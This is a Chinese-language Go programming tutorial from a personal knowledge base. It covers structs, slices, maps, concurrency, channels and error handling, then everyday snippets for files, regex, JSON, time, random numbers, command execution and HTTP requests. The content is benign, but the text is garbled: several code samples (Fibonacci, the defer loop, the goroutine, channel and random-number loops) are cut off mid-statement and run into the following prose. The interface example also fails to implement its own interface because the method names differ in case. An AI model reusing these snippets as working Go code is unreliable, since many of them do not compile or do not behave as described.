定义结构体 结构体定义需要使用 type 和 struct 语句。struct 语句定义一个新的数据类型，结构体中有一个或多个成员。type 语句设定了结构体的名称。结构体的格式如下： type struct_variable_type struct { member definition member definition ... member definition } 一旦定义了结构体类型，它就能用于变量的声明，语法格式如下： variable_name := structure_variable_type {value1, value2...valuen} // 或 variable_name := structure_variable_type { key1: value1, key2: value2..., keyn: valuen} 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{\"d4m1\", 18} fmt.Println(a) b := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(b) } /* {d4m1 18} {d4m1ts 18} */ 访问成员 如果要访问结构体成员，需要使用点号.操作符，格式为： 结构体.成员名 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(a.name) } // d4m1ts 结构体作为参数 和其他类型一样，只不过类型是结构体罢了 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} printName(a) } func printName(stru testStruct) { fmt.Println(stru.name) } 结构体指针 也和其他指针一样 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(&a) printName(&a) } func printName(stru *testStruct) { fmt.Println(stru.name) } /* &{d4m1ts 18} d4m1ts */ 切片 Go 语言切片是对数组的抽象。 Go 数组的长度不可改变，在特定场景中这样的集合就不太适用，Go 中提供了一种灵活，功能强悍的内置类型切片(\"动态数组\")，与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。 定义切片 可以声明一个未指定大小的数组来定义切片，切片不需要说明长度 var identifier []type 或使用 make() 函数来创建切片: var slice1 []type = make([]type, len) // 也可以简写为 slice1 := make([]type, len) 也可以指定容量，其中 capacity 为可选参数。 make([]T, length, capacity) 这里 len 是数组的长度并且也是切片的初始长度。 实例： package main import \"fmt\" func main() { var slice1 []int fmt.Println(slice1) // [] var slice2 []int = make([]int, 10) fmt.Println(slice2) // [0 0 0 0 0 0 0 0 0 0] } 初始化切片 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(s1) // [1 2 3 4 5] // 使用数组来初始化切片 d1 := [10]int {1,3,5,7,9} fmt.Println(d1) // [1 3 5 7 9 0 0 0 0 0] s2 := d1[:] fmt.Println(s2) // [1 3 5 7 9 0 0 0 0 0] s3 := d1[2:] fmt.Println(s3) // [5 7 9 0 0 0 0 0] } 空(nil)切片 一个切片在未初始化之前默认为 nil，长度为 0 package main import \"fmt\" func main() { var s1 []int fmt.Println(s1) // [] fmt.Println(s1 == nil) // true } 切片截取 和python一样，array[start:end]截取即可 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} fmt.Println(s1[2:4]) // [3 4] } len()和cap()函数 切片是可索引的，并且可以由len()方法获取长度。 切片提供了计算容量的方法cap()可以测量切片最长可以达到多少。 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(len(s1)) // 5 fmt.Println(cap(s1)) // 5 } 追加元素 通过append函数可以追加元素 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") fmt.Println(c) // [aa bb cc dd ee] } 如果想合并2个切片，也可以使用append 注意的是要添加...，如果没有 ...，它就会由于类型错误而无法编译 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") x := [] string {\"1\",\"2\",\"3\"} c = append(c, x...) fmt.Println(c) // [aa bb cc dd ee 1 2 3] } append()和copy()函数 如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。 下面的代码描述了从拷贝切片的 copy 方法和向切片追加新元素的 append 方法。 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} s1 = append(s1, 666) // [1 2 3 4 5 666] s1 = append(s1, 7,8,9) // [1 2 3 4 5 666 7 8 9] fmt.Println(s1) s2 := make([]int, len(s1)*2, cap(s1)*2) copy(s2, s1) // 把s1的内容复制给s2 fmt.Println(s2) // [1 2 3 4 5 666 7 8 9 0 0 0 0 0 0 0 0 0] } 集合(Map) Map 是一种无序的键值对的集合。Map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。 Map 是一种集合，所以我们可以像迭代数组和切片那样迭代它。不过，Map 是无序的，我们无法决定它的返回顺序，这是因为 Map 是使用 hash 表来实现的。 定义Map 可以使用内建函数 make 也可以使用 map 关键字来定义 Map: /* 声明变量，默认 map 是 nil */ var map_variable map[key_data_type]value_data_type /* 使用 make 函数 */ map_variable := make(map[key_data_type]value_data_type) 实例： package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" fmt.Println(m1) // 2.使用make创建 m2 := make(map[string]string) m2 [\"e\"] = \"f\" fmt.Println(m2) } 删除元素 delete()函数用于删除集合的元素, 参数为map和其对应的key package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" delete(m1, \"a\") fmt.Println(m1) // map[b:test2 c:test3] } 范围(Range) range 关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。在数组和切片中它返回元素的索引和索引对应的值，在集合中返回 key-value 对 package main import \"fmt\" func main() { // 遍历切片 var s1 = []int {1,2,3,4,5} sum := 0 for _,num := range s1 { // _空白符，表示被舍弃的变量，这里的变量是索引 sum += num } fmt.Println(sum) // 遍历map m1 := map[string]string{ \"a\":\"test1\", \"b\":\"test2\", } for k,v := range m1 { fmt.Println(k, v) } } 类型转换 类型转换用于将一种数据类型的变量转换为另外一种类型的变量 语法： type_name为类型，expression为表达式 type_name(expression) 实例： package main import \"fmt\" func main() { a := 1 fmt.Println(string(a)) // 空 fmt.Println(float32(a)) // 1 } 递归 递归，就是在运行的过程中调用自己 阶乘实例 package main import \"fmt\" func Factorial(n uint64)(result uint64) { if (n > 0) { result = n * Factorial(n-1) return result } return 1 } func main() { var i int = 15 fmt.Printf(\"%d 的阶乘是 %d\\n\", i, Factorial(uint64(i))) } // 15 的阶乘是 1307674368000 斐波那契数列实例 package main import \"fmt\" func fibonacci(n int) int { if n 接口 Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口 和其他语言如java的接口一样 声明接口 type interface_name interface { method_name1([args ...arg_type]) [return_type] method_name2([args ...arg_type]) [return_type] method_name3([args ...arg_type]) [return_type] ... method_namen([args ...arg_type]) [return_type] } 一个接口中可以定义多个方法，根据逻辑需要，自定义参数和返回值。 实现接口 一个结构体实现了某个接口的所有方法，则此结构体就实现了该接口。 实例： package main import \"fmt\" // 定义接口 type testImpl interface { testFunc1(a int, b int) } // 定义结构体 type testStruct struct { } // 实现函数 func (testMethod testStruct) TestFunc1(a int, b int) int { return a+b } // 调用函数 func main() { test := testStruct{} // 实例化方法1 res := test.TestFunc1(10,20) fmt.Println(res) test1 := new(testStruct) // 实例化方法2 res1 := test1.TestFunc1(10,20) fmt.Println(res1) } new和make Go提供了两种分配原语，即内建函数 new 和 make。 它们所做的事情不同，所应用的类型也不同。它们可能会引起混淆，但规则却很简单。 new 这是个用来分配内存的内建函数，但与其它语言中的同名函数不同，它不会初始化内存，只会将内存置零。也就是说，new(T) 会为类型为 T 的新项分配已置零的内存空间，并返回它的地址，也就是一个类型为 *T 的值。 它返回一个指针，该指针指向新分配的，类型为T的零值 实例： package main import ( \"fmt\" ) func main() { type test struct { a int b int } p := new(test) fmt.Println(p) // &{0 0} fmt.Println(*p) // {0 0} } make 内建函数 make(T, args) 的目的不同于 new(T)，它只用于创建切片、映射和信道，并返回类型为 T（而非 *T）的一个已初始化（而非置零）的值。 注意：make只适用于映射、切片和信道且不返回指针。若要获得明确的指针，请使用new分配内存。 defer defer 语句用于预设一个函数调用（即推迟执行函数）， 该函数会在执行 defer 的函数返回之前立即执行。它显得非比寻常， 但却是处理一些事情的有效方式，例如无论以何种路径返回，都必须释放资源的函数。 典型的例子就是解锁互斥和关闭文件。 被推迟函数的实参（如果该函数为方法则还包括接收者）在推迟执行时就会求值， 而不是在调用执行时才求值。这样不仅无需担心变量值在函数执行时被改变， 同时还意味着单个已推迟的调用可推迟多个函数的执行。 实例： 被推迟的函数按照后进先出（LIFO）的顺序执行，因此以上代码在函数返回时会打印 4 3 2 1 0 package main import ( \"fmt\" ) func main() { for i := 0; i 并发 go程 称之为Go程是因为现有的术语—线程、协程、进程等等—无法准确传达它的含义。 Go程具有简单的模型：它是与其它Go程并发运行在同一地址空间的函数。它是轻量级的，所有消耗几乎就只有栈空间的分配；而且栈最开始是非常小的，所以它们很廉价，仅在需要时才会随着堆空间的分配（和释放）而变化。 Go语言支持并发，我们只需要通过 go 关键字来开启 goroutine 即可。 goroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。 语法： go 函数名( 参数列表 ) Go 允许使用 go 语句开启一个新的运行期线程， 即 goroutine，以一个不同的、新创建的 goroutine 来执行一个函数。 同一个程序中的所有 goroutine 共享同一个地址空间 实例： package main import ( \"fmt\" \"time\" ) func loop() { i := 1 for i 执行代码后，输出结果为1 1 1 2 2 2 3 3 3 ...，因为是3个goroutine在同时执行 通道（channel） 通道（channel，也叫信道）是用来传递数据的一个数据结构。 主要是获取并发的每个函数返回的数据 通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。 ch 声明一个通使用chan关键字即可，通道在使用前必须先创建： ch := make(chan int) 实例： package main import \"fmt\" // 计算和 func loop(res chan int) { i := 1 sum := 0 for i 通道缓冲区 通道可以设置缓冲区，通过 make 的第二个参数指定缓冲区大小 ch := make(chan int, 100) 带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。 不过由于缓冲区的大小是有限的，所以还是必须有接收端来接收数据的，否则缓冲区一满，数据发送端就无法再发送数据了。 注意：如果通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。如果通道带缓冲，发送方则会阻塞直到发送的值被拷贝到缓冲区内；如果缓冲区已满，则意味着需要等待直到某个接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。 实例： package main import \"fmt\" // 计算所有通道的和 func loop(res chan int) { i := 1 for i 注意事项 接收者在收到数据前会一直阻塞。若信道是不带缓冲的，那么在接收者收到值前，发送者会一直阻塞；若信道是带缓冲的，则发送者仅在值被复制到缓冲区前阻塞；若缓冲区已满，发送者会一直等待直到某个接收者取出一个值为止。 遍历通道 通过 range 关键字来实现遍历读取到的数据，类似于与数组或切片 实例： package main import \"fmt\" func loop(res chan int) { i := 1 for i 关闭通道 如果通道接收不到数据后 ok 就为 false，这时通道就可以使用 close() 函数来关闭 package main import \"fmt\" func loop(res chan int) { i := 1 for i 异常处理 在异常处理方面，Go语言不像其他语言，使用try..catch.. finall...， 而使用defer, panic, recover，将异常和控制流程区分开。即通过panic抛出异常，然后在defer中，通过recover捕获这个异常，最后处理。 但是更加推荐的错误处理方法： Golang中我们通常会在函数或方法中返回**error**结构对象来判断是否有异常出现，并且可以更具需要自定义各种类型的error。如果返回的 error 值为 nil，则表示未遇到错误，否则 error 会返回一个字符串，用于说明遇到了什么错误。 error类型是一个接口类型，自定义的错误类型必须实现Error()方法，这是它的定义： type error interface { Error() string } 生成error 1、原生New方法，将字符串 text 包装成一个 error 对象返回 func New(text string) error { return &errorString{text} } //例如 errorIns := errors.New(\"test content\") fmt.Println(errorIns) 2、定义自己的错误 package main import ( \"fmt\" \"time\" ) // 定义结构体 type MyError struct { When time.Time What string } // 实现error接口中的方法 func (e MyError) Error() string { return fmt.Sprintf(\"%v: %v\", e.When, e.What) } // 编写异常函数 func oops() error { return MyError{ time.Date(1989, 3, 15, 22, 30, 0, 0, time.UTC), \"the file system has gone away\", } } func main() { if err := oops(); err != nil { fmt.Println(err) } } Panic异常 向调用者报告错误的一般方式就是将 error 作为额外的值返回；但是这种情况下程序不会退出，如果我们遇到了出现异常就必须停止程序的情况，就会使用到panic Go提供了内建的 panic 函数 它会产生一个运行时错误并终止程序 该函数接受一个任意类型的实参（一般为字符串），并在程序终止时打印 它还能表明发生了意料之外的事情，比如从无限循环中退出了package main import \"fmt\" func main() { panic(\"sth error !!!\") fmt.Println(\"hello world\") } /* panic: sth error !!! goroutine 1 [running]: main.main() /Users/d4m1ts/go/src/goTest/Hello.go:6 +0x39 */ 因为会直接停止整个程序，所以实际的库函数应避免 panic，若问题可以被屏蔽或解决， 最好就是让程序继续运行而不是终止整个程序恢复 当 panic 被调用后（包括不明确的运行时错误，例如切片检索越界或类型断言失败）， 程序将立刻终止当前函数的执行，并开始回溯Go程的栈，运行任何被推迟（defer）的函数。 若回溯到达Go程栈的顶端，程序就会终止。不过我们可以用内建的 recover 函数来重新或来取回Go程的控制权限并使其恢复正常执行。 实例：package main import ( \"fmt\" \"time\" ) func loop(a int){ defer func() { // 触发panic异常就会调用这个推迟函数 if err := recover(); err != nil { // recover函数恢复 fmt.Println(\"loop error: \", err) } }() if a > 3{ panic(\"erro a > 3\") } else { fmt.Println(\"normal: \", a) } } func main() { i := 0 for i 3 normal: 3 */ 通过恰当地使用恢复模式，do 函数（及其调用的任何代码）可通过调用 panic 来避免更坏的结果。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:26 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/01.GO基础/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/01.GO常用基础实例.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/01.GO常用基础实例.html","title":"01.GO常用基础实例","keywords":"","body":" 介绍 读文件 按字节读取文件 借助ioutil来读取 仅使用ioutil包来完成读取操作 利用Scanner按行读取 写文件 使用ioutil 通过File句柄 通过bufio包 正则表达式 匹配内容是否存在 提取内容 替换内容 其他 JSON序列化和反序列化 标准JSON模块 更优的jsoniter 扩展 时间日期 随机数 伪随机数 真随机数 URL解析 Base64 命令行参数 执行系统命令 只执行命令，不获取结果 执行命令获取结果 执行命令获取结果并区分stdout和stderr 多条命令使用管道执行 扩展 HTTP请求 快速发起get请求 带有参数的GET请求 返回JSON的数据包 自定义Header头 快速发起POST请求 自定义POST请求 忽略证书 cookieJar和代理设置 gzip解压 go flag 颜色输出 参考 介绍 记录一些可能常用到的实例，便于快速查询 读文件 按字节读取文件 这种方式是以字节为单位来读取，相对底层一些，代码量也较大 package main import ( \"fmt\" \"io\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() buf := make([]byte, 1024) // 每次读取1024字节 var res string // 存放最终的结果 for { count, err := file.Read(buf) if err == io.EOF { // 检测是否到结尾 break } else { currBytes := buf[:count] // 读取了count字节 res += string(currBytes) // 最终结果 } } fmt.Println(res) } 借助ioutil来读取 由于 os.File 也是 io.Reader 的实现，我们可以调用 ioutil.ReadAll(io.Reader) 方法，将文件所有字节读取出来，省去了使用字节缓存循环读取的过程。 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() byteRes, _ := ioutil.ReadAll(file) // 返回存放结果的切片 fmt.Printf(\"%T\\n\", byteRes) // []uint8 fmt.Println(string(byteRes)) } 仅使用ioutil包来完成读取操作 为了进一步简化文件读取操作，ioutil 还提供了 ioutil.ReadFile(filename string) 方法，一行代码搞定读取任务 package main import ( \"fmt\" \"io/ioutil\" ) func main() { data, _ := ioutil.ReadFile(\"test.txt\") fmt.Println(string(data)) } 利用Scanner按行读取 逐行读取文件内容，这个时候可以 Scanner 来完成 package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file, _ := os.Open(\"test.txt\") defer file.Close() scanner := bufio.NewScanner(file) // 类似Java中的Scanner for scanner.Scan() { fmt.Println(scanner.Text()) } } 写文件 使用ioutil 刚才用到了ioutil.ReadFile，与之对应的，肯定也有WriteFile 该函数属于全覆盖写入，如果文件不存在，则会根据指定的权限创建文件，如果存在，则会先清空文件原有内容，然后再写入新数据 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { data := []byte(\"hello d4m1ts\") fmt.Println(os.FileMode(0666).String()) // -rw-rw-rw- ioutil.WriteFile(\"test.txt\", data, 0666) } 通过File句柄 os.OpenFile(name string, flag int, perm FileMode)方法，通过指定额外的 读写方式 和 文件权限 参数，使文件操作变得更为灵活。 flag 有以下几种常用的值： os.O_CREATE: create if none exists 不存在则创建 os.O_RDONLY: read-only 只读 os.O_WRONLY: write-only 只写 os.O_RDWR: read-write 可读可写 os.O_TRUNC: truncate when opened 文件长度截为0：即清空文件 os.O_APPEND: append 追加新数据到文件package main import ( \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) // 按照特定权限打开 defer file.Close() data := []byte(\"hello d4m1ts\") count, _ := file.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = file.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) file.Sync() // 确保写入到磁盘 } 通过bufio包 这种方式其实是在File句柄上做了一层封装，调用方式和上面直接写入非常相似package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) defer file.Close() writer := bufio.NewWriter(file) data := []byte(\"hello d4m1ts\") count, _ := writer.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = writer.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) writer.Flush() // 清空缓存，确保写入到磁盘 } 正则表达式 匹配内容是否存在 package main import ( \"fmt\" \"regexp\" ) func main() { regex := \"\\\\d{1,3}\" res, _ := regexp.MatchString(regex, \"123123\") res1, _ := regexp.MatchString(regex, \"aaaa\") fmt.Println(res) // true fmt.Println(res1) // false } 提取内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.MatchString(\"123123123123\")) // true fmt.Println(regex.FindString(\"123213123123\")) // 123213 返回第一个匹配的 fmt.Println(regex.FindStringIndex(\"123213123123\")) // [0 6] 返回第一个匹配的开始和结尾的索引 fmt.Println(regex.FindStringSubmatch(\"123213123123\")) // [123213 123] 返回包括()这种子匹配的 fmt.Println(regex.FindAllString(\"123213123123\",-1)) // [123213 123123] 返回匹配的所有内容，n表示为返回个数，-1则返回全部 fmt.Println(regex.FindAllStringSubmatch(\"123213123123\",-1)) // [[123213 123] [123123 123]] 同时返回子匹配的结果 fmt.Println(regex.FindAll([]byte(\"123123123123\"), -1)) // [[49 50 51 49 50 51] [49 50 51 49 50 51]] 通过字节去匹配，返回的也是字节的结果 } 替换内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.ReplaceAllString(\"123123123213\",\"a\")) // aa } 其他 在线正则表达式测试网站：https://regex101.com/ golang正则匹配的时候，.默认是不匹配换行的，所以要匹配多行数据就容易出问题 这个时候可以采用如下格式，让.也可以匹配换行(?s).* 实例： JSON序列化和反序列化 标准JSON模块 Go 语言标准库 encoding/json 提供了操作 JSON 的方法，一般可以使用 json.Marshal 和 json.Unmarshal 来序列化和解析 JSON 字符串 实例一：package main import ( \"encoding/json\" \"fmt\" ) func main() { // 序列化 s1 := []string{\"apple\", \"peach\", \"pear\"} s2, _ := json.Marshal(s1) // 转字符串 fmt.Println(string(s2)) // [\"apple\",\"peach\",\"pear\"] // 反序列化 var s3 [] string json.Unmarshal([]byte(s2), &s3) // 字符串恢复 fmt.Println(s3) // [apple peach pear] fmt.Println(len(s3), s3[0]) // 3 apple } 实例二：package main import ( \"encoding/json\" \"fmt\" ) // 定义结构体，变量名注意大写，因为跨到json包了 type User struct { Name string Age int } func main() { // 初始化结构体 user := User{ Name: \"d4m1ts\", Age: 18, } // 序列化，转字符串 s1, _ := json.Marshal(user) fmt.Println(string(s1)) // 反序列化，恢复为原来的结构 user2 := User{} json.Unmarshal(s1, &user2) fmt.Println(user2) } 更优的jsoniter 标准库 encoding/json 在使用时需要预先定义结构体，使用时显得不够灵活。这时候可以尝试使用 github.com/json-iterator/go 模块，其除了提供与标准库一样的接口之外，还提供了一系列更加灵活的操作方法。go get -v github.com/json-iterator/go package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" ) func main() { // 反序列化，恢复为原来的结构 s := `{\"a\":\"b\", \"c\":[\"d\",\"e\",\"f\"]}` res := jsoniter.Get([]byte(s), \"c\") fmt.Println(res.ToString()) // [\"d\",\"e\",\"f\"] 只解析\"c\"的内容部分 } 扩展 大多数时候获取的json数据可能是映射+切片形式的，只有上面的一些内容很难搞，所以还是补充一下 使用.GetInterface()会自动给结果转换为interface{}，再通过这个结果继续转换，如[]interface{} 想要拿到最后的数据，只需要通过数据.(对应的格式)即可，如 aaa.(string)表示转换为string [!note] 一步一步看吧，用.GetInterface()或者等报错提示，就可以看到应该转换的格式了，如下图右边就是可以转换的格式 func main() { strings := \"{\\\"a\\\":[{\\\"b\\\":\\\"c\\\"}]}\" var res interface{} res = jsoniter.Get([]byte(strings), \"a\").GetInterface() fmt.Println(res.([]interface{})) for _,i := range res.([]interface{}) { fmt.Println(i.(map[string]interface{})) } } 时间日期 package main import ( \"fmt\" \"time\" ) func main() { p := fmt.Println // 现在的时间 now := time.Now() p(now) // 休眠1秒 time.Sleep(time.Second * 1) p(time.Now()) // 现在的时间 // 格式类型转换 t1, _ := time.Parse(time.RFC3339, \"2012-11-01T22:08:41+00:00\") p(t1) // 2012-11-01 22:08:41 +0000 +0000 // 格式化输出 p(now.Format(\"3:04PM\")) // 5:14PM p(now.Format(\"Mon Jan _2 15:04:05 2006\")) // Tue Dec 28 17:15:49 2021 p(now.Format(\"2006-01-02T15:04:05.999999-07:00\")) // 2021-12-28T17:15:49.121777+08:00 p(now.Format(time.RFC850)) // Tuesday, 28-Dec-21 17:20:02 CST fmt.Printf(\"%d-%02d-%02dT%02d:%02d:%02d-00:00\\n\", now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second()) // 2021-12-28T17:20:02-00:00 } 随机数 伪随机数 Go的math/rand包提供伪随机数生成。例如，rand.Intn返回一个随机int n，0 。 伪随机生成的数字是确定的，不论在什么机器、什么时间，只要执行的随机代码一样，那么生成的随机数就一样 package main import ( \"fmt\" \"math/rand\" ) func main() { p := fmt.Println p(rand.Int()) // 5577006791947779410 p(rand.Int31n(int32(60))) // 27 for i:=0; i 真随机数 crypto/rand是为了提供更好的随机性满足密码对随机数的要求，在linux上已经有一个实现就是/dev/urandom，crypto/rand就是从这个地方读“真随机”数字返回，但性能比较慢 package main import ( \"crypto/rand\" \"math/big\" ) func main() { for i := 0; i URL解析 可以直接使用url.Parse(string u)来解析，其中包括方案，身份验证信息，主机，端口，路径，查询参数和查询片段等信息 package main import ( \"fmt\" \"net/url\" ) func main() { u := \"https://admin:password@blog.gm7.org/test/point?a=123&b=test\" uu, _ := url.Parse(u) fmt.Println(uu.Scheme) fmt.Println(uu.User) fmt.Println(uu.User.Username()) fmt.Println(uu.Host) fmt.Println(uu.Path) fmt.Println(uu.Hostname()) fmt.Println(uu.Query()) } /* https admin:password admin blog.gm7.org /test/point blog.gm7.org map[a:[123] b:[test]] */ Base64 package main import ( \"encoding/base64\" \"fmt\" ) func main() { a := \"123456\" res := base64.StdEncoding.EncodeToString([] byte(a)) fmt.Println(res) // MTIzNDU2 decod, _ := base64.StdEncoding.DecodeString(res) fmt.Println(string(decod)) // 123456 } 命令行参数 从命令行获取参数，得到的是一个切片 package main import ( \"fmt\" \"os\" ) func main() { args := os.Args fmt.Println(args) } /* go run Hello.go 123 456 [/var/folders/fw/tddtsjp91wb9q64l5xt7jd540000gn/T/go-build3185553057/b001/exe/Hello 123 456] */ 执行系统命令 在 Golang 中用于执行命令的库是 os/exec，exec.Command 函数返回一个 Cmd 对象，根据不同的需求，可以将命令的执行分为三种情况 只执行命令，不获取结果 执行命令，并获取结果（不区分 stdout 和 stderr） 执行命令，并获取结果（区分 stdout 和 stderr） 只执行命令，不获取结果 直接调用Run()函数 package main import ( \"fmt\" \"os/exec\" ) func main() { res := exec.Command(\"open\", \"-na\", \"Calculator\").Run() // run会阻塞等到命令执行结束 fmt.Println(res) // } 执行命令获取结果 可以调用 cmd 的 CombinedOutput 函数 package main import ( \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") res, _ := cmd.CombinedOutput() fmt.Println(string(res)) // ls -la 执行结果 } 执行命令获取结果并区分stdout和stderr package main import ( \"bytes\" \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") var stdout, stderr bytes.Buffer cmd.Stdout = &stdout cmd.Stderr = &stderr cmd.Run() fmt.Println(string(stdout.Bytes())) // ls -la 执行结果 } 多条命令使用管道执行 就是类似shell里面|的作用，ls -la | grep go package main import ( \"fmt\" \"os\" \"os/exec\" ) func main() { cmd1 := exec.Command(\"ls\", \"-la\") cmd2 := exec.Command(\"grep\", \"go\") cmd2.Stdin, _ = cmd1.StdoutPipe() cmd2.Stdout = os.Stdout cmd2.Start() cmd1.Run() cmd2.Wait() fmt.Println(cmd2.Stdout) // ls -la | grep go 执行结果 } 扩展 前面每个空格间都需要单独一个参数，有时候很长就不方便，可以采用如下的方式来 cmd := exec.Command(\"/bin/sh\",\"-c\",\"expr 2 + 33\") HTTP请求 快速发起get请求 package main import ( \"fmt\" \"io/ioutil\" \"net/http\" ) func main() { url := \"https://www.baidu.com/\" response,_ := http.Get(url) // 发起get请求 defer response.Body.Close() fmt.Println(response.StatusCode) fmt.Println(response.Header.Get(\"Server\")) body, _ := ioutil.ReadAll(response.Body) fmt.Println(string(body)) // 源码 } 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 带有参数的GET请求 可以直接在上面的url后面直接构造参数，也可以通过如下的方式手动设置参数 package main import ( \"fmt\" \"net/http\" \"net/url\" ) func main() { u := \"http://baidu.com/\" Url, _ := url.Parse(u) param := url.Values{} param.Set(\"name\", \"d4m1ts\") param.Set(\"中文\", \"汉字测试\") Url.RawQuery = param.Encode() // 包含URL编码 fmt.Println(Url) // http://baidu.com/?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 resp,_ := http.Get(Url.String()) fmt.Println(resp.StatusCode) // 200 } 收到的数据包 GET /?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 返回JSON的数据包 返回是json格式，如何快速格式化数据 返回的json内容 { \"args\": {}, \"headers\": { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Dnt\": \"1\", \"Host\": \"httpbin.org\", \"Sec-Gpc\": \"1\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\", \"X-Amzn-Trace-Id\": \"Root=1-61cbb6de-6e8a5d6a2710be6f22da6f92\" }, \"origin\": \"213.239.21.35\", \"url\": \"http://httpbin.org/get\" } 一样的发起http请求，只是最后用JSON来反序列化而已 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" ) func main() { u := \"http://httpbin.org/get\" resp, err := http.Get(u) if err == nil { // 请求成功 body, _ := ioutil.ReadAll(resp.Body) origin := jsoniter.Get(body, \"origin\") fmt.Println(origin.ToString()) // 213.239.21.35 headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.Get(\"Host\").ToString()) // httpbin.org } } 自定义Header头 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" \"time\" ) func main() { // 创建一个HTTP请求，但是不发送请求 u := \"http://httpbin.org/get\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Test GO\") req.Header.Set(\"Name\", \"d4m1ts\") // 发送刚才创建的请求 client := http.Client{ Timeout: 3*time.Second, // 超时时间 } resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.ToString()) } /* { \"Accept-Encoding\": \"gzip\", \"Host\": \"httpbin.org\", \"Name\": \"d4m1ts\", \"User-Agent\": \"Test GO\", \"X-Amzn-Trace-Id\": \"Root=1-61cbbb0d-68f21a6c5c36abd861b6fe99\" } */ 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Test GO Name: d4m1ts Accept-Encoding: gzip 快速发起POST请求 方法一：使用http.Post，有一点点麻烦 package main import ( \"net/http\" \"strings\" ) func main() { u := \"http://127.0.0.1:8000\" http.Post(u, \"application/x-www-form-urlencoded\", strings.NewReader(\"aa=bb\")) } 收到的http请求 